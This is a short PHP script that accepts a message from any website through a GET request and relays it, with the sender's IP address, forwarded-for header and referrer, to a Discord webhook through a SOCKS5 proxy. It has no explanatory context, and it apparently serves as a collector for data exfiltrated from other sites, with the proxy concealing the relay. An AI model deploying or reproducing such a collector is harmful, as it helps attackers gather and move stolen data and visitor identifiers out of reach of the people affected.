<?php
header("Access-Control-Allow-Origin: *");
header("Content-Type: application/json");

$origin = $_GET["origin"] ?? null;
$msg = $_GET["msg"] ?? null;

if ($origin && $msg) {
    $url = "DISCORD_URL";

    $data = [
        "content" => "REMOTE ADDRESS: " . $_SERVER["REMOTE_ADDR"] . "\n"
            . "Forwarded For: " . ($_SERVER["HTTP_X_FORWARDED_FOR"] ?? "N/A") . "\n"
            . "Referrer: " . ($_SERVER["HTTP_REFERER"] ?? "N/A") . "\n"
            . "DATA RECEIVED:\n" . $msg,
    ];

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, ["Content-Type: application/json"]);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_PROXY, "127.0.0.1:12334"); // Proxy Config
    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);

    $result = curl_exec($ch);

    if (curl_errno($ch)) {
        echo json_encode(["status" => "error", "message" => curl_error($ch)]);
    } else {
        echo json_encode(["status" => "success", "result" => $result]);
    }

    curl_close($ch);
} else {
    echo json_encode(["status" => "error", "message" => "Invalid input data"]);
}
?>

